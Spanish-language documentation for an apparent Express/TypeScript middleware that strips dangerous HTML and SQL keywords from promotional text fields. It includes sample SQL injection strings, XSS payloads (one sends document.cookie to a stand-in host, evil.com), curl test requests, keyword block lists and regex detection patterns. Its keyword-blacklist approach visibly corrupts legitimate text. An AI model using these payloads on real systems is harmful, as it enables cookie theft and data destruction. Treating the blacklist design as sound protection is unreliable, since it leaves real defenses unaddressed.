# Documentación: Sanitización HTML para Text Elements

## Índice

1. [Introducción](#introducción)
2. [Contexto y Necesidad](#contexto-y-necesidad)
3. [Arquitectura de Seguridad](#arquitectura-de-seguridad)
4. [Implementación Técnica](#implementación-técnica)
5. [Amenazas Protegidas](#amenazas-protegidas)
6. [Ejemplos de Uso](#ejemplos-de-uso)
7. [Pruebas y Validación](#pruebas-y-validación)
8. [Mantenimiento](#mantenimiento)

---

## Introducción

Este documento describe la implementación del middleware de sanitización HTML para la tabla `text_elements`, diseñado para proteger la aplicación contra inyecciones SQL y ataques XSS mientras preserva el formato HTML seguro del contenido editorial.

**Versión:** 1.0  
**Fecha:** 27 de Noviembre, 2025  
**Autor:** Equipo Backend - Smart Fit Costa Rica

---

## Contexto y Necesidad

### Problema

El frontend de la aplicación permite a los usuarios crear y editar contenido HTML rico usando elementos `contenteditable`. Este contenido incluye:

- Títulos y encabezados
- Descripciones de descuentos
- Términos y condiciones
- Restricciones de beneficios

**Ejemplo de contenido del frontend:**

```html
<h1>CONVERSE</h1>
<p><strong>20% de descuento</strong> en Tiendas Converse</p>
<ul>
  <li>Beneficio válido: Del 1 de septiembre al 30 de noviembre 2025</li>
  <li>Redimible: Tiendas Converse de Metromall, Multiplaza y Albrook mall</li>
  <li>Exclusivo para usuarios Black de Smart Fit</li>
</ul>
```

### Riesgos Sin Sanitización

1. **SQL Injection:** Usuarios maliciosos podrían inyectar comandos SQL
2. **XSS (Cross-Site Scripting):** Scripts maliciosos podrían ejecutarse en navegadores
3. **Robo de Credenciales:** Intentos de acceder a información sensible
4. **Ejecución de Código:** Archivos maliciosos o scripts del lado del servidor

### Solución Implementada

Middleware de sanitización que:
- ✅ Elimina contenido peligroso
- ✅ Preserva HTML seguro y formato
- ✅ Registra intentos de ataque
- ✅ Se ejecuta automáticamente en cada petición

---

## Arquitectura de Seguridad

### Flujo de Seguridad

```
Frontend (HTML Editor)
        ↓
    [Request]
        ↓
   verify_JWT ← Autenticación
        ↓
    isAdmin ← Autorización
        ↓
sanitizeHtmlContent ← SANITIZACIÓN ⭐
        ↓
   Controller
        ↓
    Service
        ↓
   Database
```

### Capas de Protección

1. **Autenticación (JWT):** Solo usuarios autenticados
2. **Autorización (Admin):** Solo administradores
3. **Sanitización (HTML):** Limpieza de contenido
4. **Validación (Sequelize):** Tipos de datos correctos

---

## Implementación Técnica

### Archivo Principal

**Ubicación:** `src/middlewares/sanitizeHtml.ts`

### Estructura del Middleware

```typescript
export const sanitizeHtmlContent = (req, res, next) => {
    // 1. Define palabras clave peligrosas
    const dangerousKeywords = [...];
    
    // 2. Define patrones regex peligrosos
    const dangerousPatterns = [...];
    
    // 3. Función de sanitización
    const sanitizeString = (text) => {
        // Elimina patrones peligrosos
        // Elimina palabras clave
        // Limpia espacios
        return sanitized;
    };
    
    // 4. Aplica a campos específicos
    fieldsToSanitize.forEach(field => {
        req.body[field] = sanitizeString(req.body[field]);
    });
    
    next();
};
```

### Campos Sanitizados

El middleware procesa automáticamente estos campos del `req.body`:

| Campo | Tipo | Descripción |
|-------|------|-------------|
| `discount_description` | string | Descripción del descuento |
| `description` | string | Descripción detallada |
| `terms_conditions` | string | Términos y condiciones |
| `restrictions` | string | Restricciones del beneficio |
| `url_terms_conditions` | string | URL de términos |

### Integración en Rutas

**Archivo:** `src/routes/text_elements.routes.ts`

```typescript
import { sanitizeHtmlContent } from "../middlewares/sanitizeHtml";

// CREATE con sanitización
textElementsRouter.post(
  "/create-text-element", 
  verify_JWT, 
  isAdmin, 
  sanitizeHtmlContent,  // ← Middleware de seguridad
  createTextElementController
);

// UPDATE con sanitización
textElementsRouter.put(
  "/update-text-element/:id", 
  verify_JWT, 
  isAdmin, 
  sanitizeHtmlContent,  // ← Middleware de seguridad
  updateTextElementController
);
```

---

## Amenazas Protegidas

### 1. SQL Injection

#### Palabras Clave Bloqueadas

**Comandos DML:**
- `select`, `insert`, `update`, `delete`

**Comandos DDL:**
- `drop`, `create`, `alter`, `truncate`

**Comandos de Control:**
- `grant`, `revoke`, `commit`, `rollback`

**Funciones Peligrosas:**
- `exec`, `execute`, `union`, `join`
- `sleep`, `benchmark`, `waitfor`, `delay`
- `load_file`, `into outfile`, `into dumpfile`

**Esquemas del Sistema:**
- `information_schema`, `mysql`, `pg_`, `sys.`

**Comentarios SQL:**
- `--`, `/*`, `*/`, `#`

**Operadores:**
- `;--`, `||`, `&&`, `xp_`, `sp_`

#### Ejemplo de Protección

**Input Malicioso:**
```html
<p>Descuento válido</p>
'; DROP TABLE users; --
SELECT * FROM passwords WHERE user='admin'
```

**Output Sanitizado:**
```html
<p>Descuento válido</p>
```

---

### 2. Cross-Site Scripting (XSS)

#### Patrones Bloqueados

**Tags Completos:**
```regex
/<script[\s\S]*?>[\s\S]*?<\/script>/gi
```

**Protocolos Peligrosos:**
```regex
/javascript:/gi
/vbscript:/gi
```

**Event Handlers:**
```regex
/on\w+\s*=/gi  // onclick, onerror, onload, etc.
```

**Funciones Peligrosas:**
```regex
/eval\s*\(/gi
/expression\s*\(/gi
```

**Tags Peligrosos:**
```regex
/<iframe[\s\S]*?>/gi
/<object[\s\S]*?>/gi
/<embed[\s\S]*?>/gi
```

**Data URIs:**
```regex
/data:text\/html/gi
```

#### Ejemplo de Protección

**Input Malicioso:**
```html
<p onclick="alert('XSS')">Click aquí</p>
<script>
  fetch('http://evil.com/steal?cookie=' + document.cookie);
</script>
<img src="x" onerror="javascript:alert('Hacked')">
```

**Output Sanitizado:**
```html
<p>Click aquí</p>


<img src="x">
```

---

### 3. Protección de Credenciales

#### Palabras Sensibles Bloqueadas

- `password`, `passwd`, `pwd`
- `user`, `username`, `admin`, `root`
- `credential`, `token`, `secret`, `key`
- `auth`, `authentication`

#### Ejemplo de Protección

**Input Malicioso:**
```html
<p>Ingresa tu password aquí: admin123</p>
<p>Token de acceso: secret_key_12345</p>
```

**Output Sanitizado:**
```html
<p>Ingresa tu aquí: 123</p>
<p>de acceso: _12345</p>
```

---

### 4. Prevención de Ejecución de Código

#### Extensiones Bloqueadas

- **Scripts:** `.js`, `.py`, `.php`, `.rb`, `.pl`
- **Ejecutables:** `.exe`, `.bat`, `.sh`, `.cmd`, `.vbs`
- **Código del Servidor:** `.asp`, `.aspx`, `.jsp`
- **Otros:** `.jar`, `.sql`

#### Ejemplo de Protección

**Input Malicioso:**
```html
<a href="malware.exe">Descargar</a>
<script src="hack.js"></script>
```

**Output Sanitizado:**
```html
<a href="malware">Descargar</a>

```

---

## Ejemplos de Uso

### Caso 1: Contenido Seguro (Preservado)

**Request:**
```json
POST /text-elements/create-text-element
{
  "store_id": 1,
  "discount_description": "<strong>20% de descuento</strong> en todas las referencias",
  "description": "<h2>EVERLAST</h2><p>Moda y Accesorios</p>",
  "terms_conditions": "<ul><li>Válido del 30/06/2025 al 31/12/2025</li></ul>",
  "restrictions": "<p>No acumulable con otras promociones</p>"
}
```

**Resultado:**
✅ Todo el contenido se guarda exactamente como fue enviado (HTML seguro)

---

### Caso 2: Intento de SQL Injection

**Request:**
```json
POST /text-elements/create-text-element
{
  "store_id": 1,
  "discount_description": "50% OFF'; DROP TABLE stores; --",
  "description": "SELECT password FROM users WHERE admin=1",
  "terms_conditions": "Normal text",
  "restrictions": null
}
```

**Resultado:**
```json
{
  "store_id": 1,
  "discount_description": "50% OFF",
  "description": "",
  "terms_conditions": "Normal text",
  "restrictions": null
}
```
✅ Comandos SQL eliminados

**Log:**
```
[WARN] Contenido potencialmente peligroso detectado y sanitizado en campo: discount_description
[WARN] Contenido potencialmente peligroso detectado y sanitizado en campo: description
```

---

### Caso 3: Intento de XSS

**Request:**
```json
POST /text-elements/create-text-element
{
  "store_id": 1,
  "discount_description": "<script>alert('XSS')</script>Descuento especial",
  "description": "<img src=x onerror='fetch(\"http://evil.com\")'>",
  "terms_conditions": "<p onclick='malicious()'>Click aquí</p>",
  "restrictions": "javascript:alert(document.cookie)"
}
```

**Resultado:**
```json
{
  "store_id": 1,
  "discount_description": "Descuento especial",
  "description": "<img src=x>",
  "terms_conditions": "<p>Click aquí</p>",
  "restrictions": "(document.cookie)"
}
```
✅ Scripts y event handlers eliminados

---

### Caso 4: Contenido Mixto

**Request:**
```json
POST /text-elements/create-text-element
{
  "store_id": 1,
  "discount_description": "<h1>FITLAB</h1>",
  "description": "<p>Salud, Belleza y Bienestar</p><script>DROP TABLE users</script>",
  "terms_conditions": "<ul><li>Válido hasta 31/07/2026</li></ul>",
  "restrictions": "<p>Exclusivo usuarios Black</p><!-- SELECT * FROM passwords -->"
}
```

**Resultado:**
```json
{
  "store_id": 1,
  "discount_description": "<h1>FITLAB</h1>",
  "description": "<p>Salud, Belleza y Bienestar</p>",
  "terms_conditions": "<ul><li>Válido hasta 31/07/2026</li></ul>",
  "restrictions": "<p>Exclusivo usuarios Black</p>"
}
```
✅ HTML seguro preservado, contenido malicioso eliminado

---

## Pruebas y Validación

### Suite de Pruebas Recomendada

#### Test 1: HTML Seguro
```bash
curl -X POST http://localhost:3000/WebServices/text-elements/create-text-element \
  -H "x-access-token: YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "store_id": 1,
    "discount_description": "<strong>20%</strong> descuento",
    "description": "<p>Texto normal</p>",
    "terms_conditions": "<ul><li>Item 1</li></ul>",
    "restrictions": null
  }'
```
**Esperado:** 201 Created, contenido guardado intacto

---

#### Test 2: SQL Injection
```bash
curl -X POST http://localhost:3000/WebServices/text-elements/create-text-element \
  -H "x-access-token: YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "store_id": 1,
    "discount_description": "'; DROP TABLE users; --",
    "description": "SELECT * FROM passwords",
    "terms_conditions": "Normal",
    "restrictions": null
  }'
```
**Esperado:** 201 Created, SQL keywords removidos

---

#### Test 3: XSS Attack
```bash
curl -X POST http://localhost:3000/WebServices/text-elements/create-text-element \
  -H "x-access-token: YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "store_id": 1,
    "discount_description": "<script>alert(\"XSS\")</script>",
    "description": "<img src=x onerror=alert(1)>",
    "terms_conditions": "Normal",
    "restrictions": null
  }'
```
**Esperado:** 201 Created, scripts removidos

---

### Checklist de Validación

- [ ] HTML seguro se preserva correctamente
- [ ] Palabras clave SQL son eliminadas
- [ ] Tags `<script>` son removidos completamente
- [ ] Event handlers (onclick, etc.) son eliminados
- [ ] Protocolos javascript: y vbscript: son bloqueados
- [ ] Extensiones de archivo peligrosas son removidas
- [ ] Logs de advertencia se generan correctamente
- [ ] El formato y estructura HTML se mantiene
- [ ] No hay errores 500 durante la sanitización

---

## Mantenimiento

### Actualización de Palabras Clave

Para agregar nuevas palabras clave peligrosas:

**Archivo:** `src/middlewares/sanitizeHtml.ts`

```typescript
const dangerousKeywords = [
    // ... palabras existentes
    'nueva_palabra_peligrosa',  // ← Agregar aquí
];
```

### Actualización de Patrones Regex

Para agregar nuevos patrones de ataque:

```typescript
const dangerousPatterns = [
    // ... patrones existentes
    /nuevo_patron_peligroso/gi,  // ← Agregar aquí
];
```

### Monitoreo de Logs

Revisar regularmente los logs para detectar intentos de ataque:

```bash
grep "Contenido potencialmente peligroso" logs/app.log
```

### Actualizaciones Recomendadas

1. **Mensual:** Revisar lista de palabras clave
2. **Trimestral:** Actualizar patrones regex según nuevas amenazas
3. **Anual:** Auditoría completa de seguridad

---

## Mejores Prácticas

### Para Desarrolladores

1. ✅ **Siempre usar el middleware** en rutas que acepten HTML
2. ✅ **No confiar solo en validación frontend**
3. ✅ **Monitorear logs de sanitización**
4. ✅ **Probar con vectores de ataque conocidos**
5. ✅ **Mantener actualizada la lista de amenazas**

### Para Administradores

1. ✅ **Revisar logs semanalmente**
2. ✅ **Reportar patrones sospechosos**
3. ✅ **Validar contenido antes de publicar**
4. ✅ **Usar contraseñas fuertes**
5. ✅ **Mantener tokens JWT seguros**

---

## Limitaciones Conocidas

1. **HTML Complejo:** Estructuras HTML muy complejas pueden perder formato
2. **Falsos Positivos:** Palabras legítimas que coincidan con keywords serán removidas
3. **Performance:** En textos muy largos puede haber ligero impacto en rendimiento
4. **Idiomas:** Optimizado para español, puede necesitar ajustes para otros idiomas

---

## Soporte y Contacto

Para preguntas, reportes de bugs o sugerencias:

**Equipo:** Backend - Smart Fit Costa Rica  
**Proyecto:** beneficiosCostarica-admin-backend  
**Documentación:** Este archivo

---

## Historial de Cambios

| Versión | Fecha | Cambios |
|---------|-------|---------|
| 1.0 | 2025-11-27 | Implementación inicial del middleware de sanitización |

---

## Referencias

- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Sequelize Security Best Practices](https://sequelize.org/docs/v6/core-concepts/raw-queries/)

---

**Fin del Documento**
